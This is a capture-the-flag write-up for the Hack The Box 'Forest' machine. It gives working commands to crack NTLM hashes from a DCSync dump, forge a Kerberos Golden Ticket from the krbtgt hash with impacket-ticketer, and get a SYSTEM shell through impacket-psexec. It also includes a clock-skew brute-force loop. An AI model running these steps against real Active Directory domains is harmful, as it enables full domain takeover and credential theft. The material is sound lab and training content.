# Alternative way to exploit Forest

## Cracking the Hashes

After getting all the hashes with the **DCSync**, it can be tried to crack them with **Hashcat**:
```
hashcat --user -m 1000 forest_ntlm.hash /usr/share/wordlists/rockyou.txt

hashcat --user -m 1000 forest_ntlm.hash --show
```

## Golden Ticket

With the **DCSync** attack, the hash of _krbtgt_ is also obtained:
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
```

This user is there to sign Kerberos tickets in Windows.
If we are able to spoof this user, it is possible to create any ticket for any service which is called **Golden Ticket**.

Getting the domain SID:
```
Get-ADDomain htb.local
```
```
DomainSID : S-1-5-21-3072663084-364016917-1341370565
```

Using _impacket-ticketer_ to create the ticket in the current directory:
```
impacket-ticketer -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local Administrator
```

It created _Administrator.ccache_ that has to be exported to the environment variables:
```
export KRB5CCNAME=Administrator.ccache
```

Login into the box with the user:
```
impacket-psexec htb.local/Administrator@forest -k -no-pass
```

> NOTE: Put _htb.local_ and _forest_ with the IP 10.10.10.161 into the _/etc/hosts_ file or the domain name will not get resolved

After trying to login, **Impacket** shows the following error:
```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This means that the time on the box and our local client are different, but they have to be the same for this to work.
The initial **Nmap** scan shows that the time difference is around four and half hours.
```
_clock-skew: mean: 2h53m05s, deviation: 4h37m10s, median: 13m03s
```

Looping every hour until the correct one hits:
```
for i in $(seq 00 24); do date -s $i:30:00; impacket-psexec htb.local/Administrator@forest -k -no-pass; done
```

After it finds the correct time, **PSexec** starts and logs us into the box as _SYSTEM_.
